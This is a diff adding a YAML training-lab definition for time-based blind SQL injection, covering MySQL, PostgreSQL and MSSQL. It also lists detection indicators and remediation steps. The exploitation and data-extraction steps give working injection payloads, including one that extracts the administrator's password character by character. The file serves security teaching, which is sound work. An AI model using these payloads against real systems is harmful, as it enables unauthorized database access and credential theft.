@@ -1,0 +1,99 @@
+# Category: SQL Injection
+name: "Blind SQL injection with time delays"
+id: "sql-injection-blind-time-delays-001"
+category: "sql_injection"
+subcategory: "blind"
+difficulty: "practitioner"
+estimated_time: "60 minutes"
+
+description: |
+  This lab contains a blind SQL injection vulnerability. The application
+  does not return any visible differences, but the attacker can infer
+  information by causing time delays. This is useful when no other
+  feedback channels are available.
+
+learning_objectives:
+  - Understand time-based blind SQL injection
+  - Use time delays to infer information
+  - Extract data using time-based techniques
+
+tools:
+  - Burp Suite
+  - curl
+  - Python (for automation)
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and intercept a request"
+      - "# Observe the parameter used in the SQL query"
+    expected_output: "The parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Test for time-based blind SQL injection"
+    commands:
+      - "# Inject a payload that causes a time delay"
+      - "# For MySQL: parameter=value' AND SLEEP(5)--"
+      - "# For PostgreSQL: parameter=value' AND pg_sleep(5)--"
+      - "# For MSSQL: parameter=value' AND WAITFOR DELAY '00:00:05'--"
+      - "# Observe if the response is delayed"
+    expected_output: "Response delayed when condition is true"
+    detection: "Web server logs may show unusual delays"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Extract data using time delays"
+    commands:
+      - "# Check if a user exists"
+      - "parameter=value' AND (SELECT CASE WHEN (username='administrator') THEN SLEEP(5) ELSE NULL END FROM users)--"
+      - "# Extract password character by character"
+      - "parameter=value' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN SLEEP(5) ELSE NULL END FROM users WHERE username='administrator')--"
+    expected_output: "Password extracted character by character using time delays"
+    detection: "Database logs may show many queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with unusually long response times"
+  log_indicators:
+    - "Database logs may show many queries"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  parameter: "parameter"
+
+assessment_questions:
+  - "What is time-based blind SQL injection?"
+  - "How can you use time delays to extract data?"
+  - "What is the difference between time-based and boolean-based blind injection?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection/blind"
+    title: "PortSwigger Blind SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+    title: "OWASP Blind SQL Injection"
